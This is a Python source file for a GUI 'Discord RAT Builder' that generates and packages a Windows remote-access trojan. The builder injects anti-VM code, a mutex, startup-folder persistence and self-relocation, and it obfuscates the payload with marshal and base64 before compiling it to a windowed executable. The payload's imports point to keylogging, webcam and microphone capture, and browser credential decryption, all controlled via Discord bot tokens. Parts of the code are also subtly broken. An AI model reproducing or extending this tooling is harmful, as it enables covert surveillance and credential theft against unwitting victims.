from tkinter import *
from tkinter import filedialog, messagebox
import customtkinter as ctk
from PIL import Image
import os
import subprocess
import shutil
import threading
import marshal
import base64
import re
import webbrowser
import ctypes

scaleFactor = ctypes.windll.shcore.GetScaleFactorForDevice(0) / 100

position = 15
logs = []
line_height = 20
max_height = 145  
max_logs = max_height // line_height
building = threading.Event()

emtokens = {
    1: "",
    2: "",
    3: "",
    4: "",
    5: ""
}

building.set()

def loadconfig():
    global emtokens

    def format(target: re.Match[str], _replace: str):
        return target.group().replace("</" + _replace + ">", "").replace("<" + _replace + ">", "") 

    if os.path.exists("./Configs/config.hconfig"):
        with open("./Configs/config.hconfig", "r", encoding='utf-8') as file:
            config = file.read()

    token = re.search(r"<maintoken>(.*?)</maintoken>", config)

    emtoken1 = re.search(r"<emtoken1>(.*?)</emtoken1>", config)
    emtoken2 = re.search(r"<emtoken2>(.*?)</emtoken2>", config)
    emtoken3 = re.search(r"<emtoken3>(.*?)</emtoken3>", config)
    emtoken4 = re.search(r"<emtoken4>(.*?)</emtoken4>", config)
    emtoken5 = re.search(r"<emtoken5>(.*?)</emtoken5>", config)
    filename = re.search(r"<filename>(.*?)</filename>", config)

    guild = re.search(r"<guild>(.*?)</guild>", config)
    _prefix = re.search(r"<prefix>(.*?)</prefix>", config)
    icon = re.search(r"<icon>(.*?)</icon>", config)

    bot_token_entry.insert(0, format(token, "maintoken")) if token != None else ()

    emtokens[1] = format(emtoken1, "emtoken1") if emtoken1 != None and emtoken1 != "" else ""
    emtokens[2] = format(emtoken2, "emtoken2") if emtoken2 != None and emtoken2 != "" else ""
    emtokens[3] = format(emtoken3, "emtoken3") if emtoken3 != None and emtoken3 != "" else ""
    emtokens[4] = format(emtoken4, "emtoken4") if emtoken4 != None and emtoken4 != "" else ""
    emtokens[5] = format(emtoken5, "emtoken5") if emtoken5 != None and emtoken5 != "" else ""

    print(emtokens)

    filename_entry.insert(0, format(filename, "filename")) if filename != None and filename != "" else ()
    guild_id_entry.insert(0, format(guild, "guild")) if guild != None and guild != "" else ()
    prefix.set(value=format(_prefix, "prefix")) if _prefix != None and _prefix != "" else ()
    icon_path_entry.insert(0, format(icon, "icon")) if icon != None and icon != "" else ()

def loadimg(fp: str, size: tuple[int]):
    return ctk.CTkImage(Image.open(fp), size=size)

def animate_button():
    global building
    build_button.configure(state="disabled")

    def update_button_text(count):
        texts = ["Building", "Building .", "Building . .", "Building . . ."]
        
        build_button.configure(text=texts[count % len(texts)])
        
        if not building.is_set():
            window.after(250, update_button_text, count + 1)
        else:
            build_button.configure(state="normal", text="BUILD")

    update_button_text(0)

def choose_ico():
    choosen = filedialog.askopenfilename()

    if choosen:
        icon_path_entry.delete(0, END)
        icon_path_entry.insert(0, choosen)

def log(text: str, color: str):
    global position, logs

    if len(logs) >= max_logs:
        old_label = logs.pop(0)
        old_label.destroy() 

    log_label = ctk.CTkLabel(console, text=text, font=('Arial', 12), text_color=color)
    
    log_label.place(y=position, x=15)
    
    logs.append(log_label)

    position += line_height

    console.update()

    if len(logs) > max_logs:
        for label in logs:
            label.place_configure(y=label.winfo_y() - line_height)

        position -= line_height

def py_to_exe(icon):
    if not icon:
        cmd = f'pyinstaller --noconfirm --onefile --windowed --distpath "./Output" --workpath "./Temp" --specpath "./Temp" ./Temp/{filename_entry.get()}.py'
    else:
        cmd = f'pyinstaller --noconfirm --onefile --windowed --icon "{icon_path_entry.get()}" --distpath "./Output" --workpath "./Temp" --specpath "./Temp" ./Temp/{filename_entry.get()}.py'

    subprocess.run(f'cmd /c "{cmd}"', shell=True)

    log(f"[INFO] Build finished : {filename_entry.get()}.exe ", "white")

    building.set()

    if os.path.exists("./build"):
        shutil.rmtree("./build")

def build():
    global building, logs, position

    building.clear()

    position = 15

    for label in logs:
        label.destroy()

    if messagebox.askyesno("Current configuration", "Do you want to save this bot configuration ?"):
        with open("./Configs/config.hconfig", "w", encoding='utf-8') as file:
            if os.path.exists("./Configs/config.hconfig"):
                if messagebox.askokcancel("Config already exeisting", "A config file already exists, this config will replace it !"):
                    file.write(f"""<maintoken>{bot_token_entry.get()}</maintoken>\n<emtoken1>{emtokens[1]}</emtoken1>\n<emtoken2>{emtokens[2]}</emtoken2>\n<emtoken3>{emtokens[3]}</emtoken3>\n<emtoken4>{emtokens[4]}</emtoken4>\n<emtoken5>{emtokens[5]}</emtoken5>\n<filename>{filename_entry.get()}</filename>\n<guild>{guild_id_entry.get()}</guild>\n<prefix>{prefix.get()}</prefix>\n<icon>{icon_path_entry.get()}</icon>""")
                else:
                    return
            else:
                file.write(f"""<maintoken>{bot_token_entry.get()}</maintoken>\n<emtoken1>{emtokens[1]}</emtoken1>\n<emtoken2>{emtokens[2]}</emtoken>\n<emtoken3>{emtokens[3]}</emtoken3>\n<emtoken4>{emtokens[4]}</emtoken4>\n<emtoken5>{emtokens[5]}</emtoken5>\n<filename>{filename_entry.get()}</filename>\n<guild>{guild_id_entry.get()}</guild>\n<prefix>{prefix.get()}</prefix>\n<icon>{icon_path_entry.get()}</icon>""")

    threading.Thread(target=animate_button, daemon=True).start()

    log("[INFO] Cleaning the temporary folder", "white")

    folder_path = "./Temp"
    for item in os.listdir(folder_path):
        item_path = os.path.join(folder_path, item)
        if os.path.isfile(item_path) or os.path.islink(item_path):
            os.remove(item_path)
        elif os.path.isdir(item_path):
            shutil.rmtree(item_path)
    log("[INFO] Temp folder cleaned", "white")
    log("[INFO] Building python file...", "white")
    
    with open(f"./Temp/{filename_entry.get()}.py", "w", encoding='utf-8') as file:
        with open("./Settings/antivm.py", "r", encoding='utf-8') as tmpantivm:
            antivm = tmpantivm.read()
        
        code = antivm + "\n\n"
        code += """import random 
import time  
import os
import pyautogui 
import shutil
import requests 
import cv2 
import socket 
import uuid 
import subprocess 
import keyboard
import discord
import sounddevice as sd
import wave
import sys
import sqlite3
import json
import base64
import stat
import re 
import numpy as np
import tkinter as tk
import win32api, win32event, winerror 
import threading
import asyncio     
import ctypes

from discord.ext import commands
from tkinter import messagebox
from win32crypt import CryptUnprotectData
from Cryptodome.Cipher import AES
from winotify import Notification
from tkinter import messagebox\n\n"""
        code += fr'''
BOT = commands.Bot(command_prefix="{prefix.get()}", help_command=None, intents=discord.Intents.all())

BOT_TOKENS = ['{bot_token_entry.get()}',
               {"'" + emtokens[1] + "'," if emtokens[1] != "" else ""}
               {"'" + emtokens[2] + "'," if emtokens[2] != "" else ""}
               {"'" + emtokens[3] + "'," if emtokens[3] != "" else ""}
               {"'" + emtokens[4] + "'," if emtokens[4] != "" else ""}
               {"'" + emtokens[5] + "'," if emtokens[5] != "" else ""}
            ]

GUILD = None

mutex = win32event.CreateMutex(None, False, "Win32APIdll8298324864443849")

if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    sys.exit(0)

def isUser(ctx):
    global GUILD
    return True if ctx.channel.name == os.getlogin().lower().replace(" ", "-") else False 

def check_startup():
    user = os.getlogin()

    while True:
        startup_path = fr'C:\Users\\' + user + r'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' 
        fsp = startup_path + os.path.basename(sys.executable)

        if os.path.exists():
            with open(os.path.join(os.getenv("USERPROFILE"), "UserSystem", "srt"), "r", encoding='utf-8') as fspfile:
                content = fspfile.read()

                if not os.path.exists(content):
                    try:
                        shutil.copy(sys.executable, startup_path)

                        with open(os.path.join(os.getenv("USERPROFILE"), "UserSystem", "srt"), "w", encoding='utf-8') as fspfile:
                            fspfile.write(fsp)
                    except:
                        pass
        time.sleep(1)

def automoove():
    shutil.copy(sys.executable, os.getenv("USERPROFILE"))
    subprocess.Popen(os.path.join(os.getenv("USERPROFILE"), os.path.basename(sys.executable)), creationflags=subprocess.CREATE_NO_WINDOW)
    sys.exit()

@BOT.event
async def on_ready():  
    user = os.getlogin()

    if os.getenv("TEMP") in sys.executable and "MEI" in sys.executable:
        automoove()

    GUILD = BOT.get_guild({guild_id_entry.get()})

'''
        with open("./Settings/rat.py", "r", encoding='utf-8') as rat:
            content = rat.read()
            
            code += content
            
        code = compile(code, "<string>", "exec")

        code = marshal.dumps(code)
        code = base64.b64encode(code).decode()
        
        file.write(f'''import marshal;import base64;import random; import time;import os;import pyautogui;import shutil;import requests;import cv2;import psutil; import socket;import uuid;import subprocess;import keyboard;import discord;from discord.ext import commands;import sounddevice as sd;import wave;import sys;from tkinter import messagebox;import sqlite3;import json;import base64;from win32crypt import CryptUnprotectData;from Cryptodome.Cipher import AES;import stat;import re ;from winotify import Notification;import numpy as np;import tkinter as tk;from tkinter import messagebox;import asyncio;import ctypes;import win32api, win32event, winerror;import threading;script = base64.b64decode("{code}");exec(marshal.loads(script))\n''')

    log("[INFO] Successfully built python file", "green")

    log("[INFO] Compiling the python file to executable file...", "white")

    threading.Thread(target=py_to_exe, args=[icon_path_entry.get()], daemon=True).start()

def verify():
    if not filename_entry.get() or not bot_token_entry.get() or not guild_id_entry.get():
        messagebox.showwarning("Invalid form", "Please fill all the fields !")
        return

    try:
        guild_id_entry.get() == int(guild_id_entry.get())
    except ValueError:
        messagebox.showwarning("Invalid channel ID", "Please enter a valid channel ID")
        return
    build()

def emergency_tokens():
    global emtokens

    def remove_token(number: int, button: ctk.CTkButton, entry: ctk.CTkEntry):
        global emtokens

        button.configure(fg_color="#545454", hover_color="#464647", text="Add", command=lambda: add_token(number, button, entry))
        emtokens[number] = ""
        entry.configure(state="normal", border_color="#545454", text_color="white")
        entry.delete(0, END)
        entry.configure(placeholder_text=f"Token {number}")
        token_count.configure(text=str(tokencount()) + "/5")

    def add_token(number: int, button: ctk.CTkButton, entry: ctk.CTkEntry):
        global emtokens

        if not entry.get().replace(" ", ""):
            messagebox.showwarning("Invalid token", "Please fill the field")
            return

        button.configure(fg_color="red", hover_color="dark red", text="Remove", command=lambda: remove_token(number, button, entry))
        entry.configure(state="disabled", text_color="#464647", border_color="#464647")
        emtokens[number] = entry.get().replace(" ", "")

        token_count.configure(text=str(tokencount()) + "/5")

    def tokencount():
        global emtokens
        value = 0

        for token in emtokens.values():
            if token != "":
                value += 1
        
        return value

    def loadtoken(number: int, entry: ctk.CTkEntry, button: ctk.CTkButton):
        global emtokens

        if emtokens[number] != "":
            entry.insert(0, emtokens[number])
            button.configure(fg_color="red", hover_color="dark red", text="Remove", command=lambda: remove_token(number, button, entry))
            entry.configure(state="disabled", text_color="#464647", border_color="#464647")
            token_count.configure(text=str(tokencount()) + "/5")

    config = ctk.CTkToplevel(fg_color="#1b1b1b")
    config.geometry("600x400")
    config.resizable(False, False)
    config.title("Emergency Tokens Configuration")
    config.attributes("-topmost", True)
    config.after(200, lambda: config.iconbitmap("./Assets/hellcat.ico"))

    config_title = ctk.CTkLabel(config, text="EMERGENCY TOKENS", font=("Horizon", 25))
    config_title.place(y=50, x=85)

    token_count = ctk.CTkLabel(config, text=f"{tokencount()}/5", font=("Arial", 18, "bold"))
    token_count.place(y=90, x=260)

    token_entry_1 = ctk.CTkEntry(config, fg_color="#171717", height=30, width=400, border_color="#545454", border_width=1, corner_radius=3, placeholder_text="Token 1")
    token_entry_1.place(y=125, x=50)

    add_button1 = ctk.CTkButton(config, command=lambda: add_token(1, add_button1, token_entry_1), fg_color="#545454", corner_radius=3, width=100, height=30, hover_color="#464647", text="Add", font=("Arial", 15, "bold"))
    add_button1.place(y=125, x=460)
    loadtoken(1, token_entry_1, add_button1)

    token_entry_2 = ctk.CTkEntry(config, fg_color="#171717", height=30, width=400, border_color="#545454", border_width=1, corner_radius=3, placeholder_text="Token 2")
    token_entry_2.place(y=175, x=50)

    add_button2 = ctk.CTkButton(config, command=lambda: add_token(2, add_button2, token_entry_2) , fg_color="#545454", corner_radius=3, width=100, height=30, hover_color="#464647", text="Add", font=("Arial", 15, "bold"))
    add_button2.place(y=175, x=460)
    loadtoken(2, token_entry_2, add_button2)

    token_entry_3 = ctk.CTkEntry(config, fg_color="#171717", height=30, width=400, border_color="#545454", border_width=1, corner_radius=3, placeholder_text="Token 3")
    token_entry_3.place(y=225, x=50)

    add_button3 = ctk.CTkButton(config, command=lambda: add_token(3, add_button3, token_entry_3), fg_color="#545454", corner_radius=3, width=100, height=30, hover_color="#464647", text="Add", font=("Arial", 15, "bold"))
    add_button3.place(y=225, x=460)
    loadtoken(3, token_entry_3, add_button3)

    token_entry_4 = ctk.CTkEntry(config, fg_color="#171717", height=30, width=400, border_color="#545454", border_width=1, corner_radius=3, placeholder_text="Token 4")
    token_entry_4.place(y=275, x=50)

    add_button4 = ctk.CTkButton(config, command=lambda: add_token(4, add_button4, token_entry_4),fg_color="#545454", corner_radius=3, width=100, height=30, hover_color="#464647", text="Add", font=("Arial", 15, "bold"))
    add_button4.place(y=275, x=460)
    loadtoken(4, token_entry_4, add_button4)

    token_entry_5 = ctk.CTkEntry(config, fg_color="#171717", height=30, width=400, border_color="#545454", border_width=1, corner_radius=3, placeholder_text="Token 5")
    token_entry_5.place(y=325, x=50)

    add_button5 = ctk.CTkButton(config, command=lambda: add_token(5, add_button5, token_entry_5),fg_color="#545454", corner_radius=3, width=100, height=30, hover_color="#464647", text="Add", font=("Arial", 15, "bold"))
    add_button5.place(y=325, x=460)
    loadtoken(5, token_entry_5, add_button5)

    config.mainloop()

FRAME = None

def tglink_hover(event):
    global FRAME

    FRAME = ctk.CTkFrame(window, fg_color="#1b1b1b", corner_radius=1, height=500, width=800)
    FRAME.place(y=0, x=0)

    txt = ctk.CTkLabel(FRAME, text="No join = Not sigma", font=('Arial', 25, "bold"))
    txt.place(relx=0.5, rely=0.5, anchor="center")

    exp = ctk.CTkLabel(FRAME, text="Click to join :)", font=("Arial", 16))
    exp.place(y=150, x=345)

    arrow = ctk.CTkLabel(FRAME, text='', image=loadimg("./Assets/arrow.png", (125, 125)))
    arrow.place(y=275, x=325)

    circle = ctk.CTkLabel(FRAME, text="", image=loadimg("./Assets/circle.png", (125, 125)))
    circle.place(y=305, x=235)

    bruh = ctk.CTkLabel(FRAME, text="", image=loadimg("./Assets/bruh.png", (80, 80)))
    bruh.place(y=330, x=255)

    tglink.lift(FRAME)
    tglink.configure(font=("Arial", 35, "bold", "underline"), text_color="blue")
    tglink.place(y=90, x=250)

def tglink_leave(event):
    global FRAME

    if FRAME != None:
        FRAME.destroy()

    tglink.configure(font=("Arial", 15), text_color="white")
    tglink.place(y=90, x=338)

def tglink_open(event):
    webbrowser.open("https://t.me/cslogs")

window = ctk.CTk(fg_color="#1b1b1b")
window.geometry("800x500")
window.resizable(False, False)
window.title("Discord RAT Builder | V 3.2")
window.iconbitmap("./Assets/hellcat.ico")

title = ctk.CTkLabel(window, text="Discord RAT Builder", font=("Horizon", 35))
title.place(y=35, x=100)

tglink = ctk.CTkLabel(window, text="https://t.me/cslogs", font=("Arial", 15))
tglink.place(y=90, x=338)

tglink.bind("<Enter>", tglink_hover)
tglink.bind("<Leave>", tglink_leave)
tglink.bind("<Button-1>", tglink_open)

guild_id_entry = ctk.CTkEntry(window, height=35, width=300, fg_color="#171717", border_color="black", border_width=1, corner_radius=3, placeholder_text="Guild ID")
guild_id_entry.place(y=135, x=95)

filename_entry = ctk.CTkEntry(window, height=35, width=300, fg_color="#171717", border_color="black", border_width=1, corner_radius=3, placeholder_text="Filename")
filename_entry.place(y=135, x=405)

bot_token_entry = ctk.CTkEntry(window, height=35, width=565, fg_color="#171717", border_color="black", border_width=1, corner_radius=3, placeholder_text="Bot Token")
bot_token_entry.place(y=185, x=95)

add_token_button = ctk.CTkButton(window, command=lambda: emergency_tokens(), corner_radius=3, text="", height=32, width=35, fg_color="#545454", hover_color="#464647", image=loadimg("./Assets/plus.png", ( 15, 15)))
add_token_button.place(y=186, x=670)
                       
icon_path_entry = ctk.CTkEntry(window, height=35, width=425, fg_color="#171717", border_color="black", border_width=1, corner_radius=3, placeholder_text="Icon Path")
icon_path_entry.place(y=235, x=95)

choose_icon_button = ctk.CTkButton(window, height=32.5, fg_color="#545454", corner_radius=3, text="Browse", width=175, hover_color="#464647", command=choose_ico, font=("Arial", 15, "bold"))
choose_icon_button.place(y=235.5, x=532)

prefix = ctk.StringVar(value="+")
prefix_choice = ctk.CTkComboBox(window, dropdown_fg_color="#171717", border_width=1, font=("Arial", 15), state="readonly", dropdown_font=("Arial", 15), width=325, height=34, corner_radius=3, dropdown_hover_color="black", dropdown_text_color="white", fg_color="#171717", border_color="black", values=["!", ".", "?", "-", "~", "+", "*", "#", "$", "&", "%",">", "<", "=", ":", ";", "/", "_","@"], variable=prefix)
prefix_choice.place(y=285, x=95)

build_button = ctk.CTkButton(window, command=verify, height=34, width=275, fg_color="#545454", hover_color="red", corner_radius=3, text="BUILD", font=("Horizon", 15))
build_button.place(y=285, x=432)

console = ctk.CTkFrame(window, fg_color="black", corner_radius=5, height=150, width=610)
console.place(y=335, x=95)

if os.path.exists("./Configs/config.hconfig"):
    loadconfig() if messagebox.askyesno("Configuration found", "A configuration was found, do you want to load it ?") else ()

if not os.path.exists("./Configs/opened.open"):
    webbrowser.open("https://t.me/cslogs")
    webbrowser.open("https://guns.lol/Noone.cs")

    with open('./Configs/opened.open', "w", encoding='utf-8') as opf:
        opf.write("opened")

window.mainloop()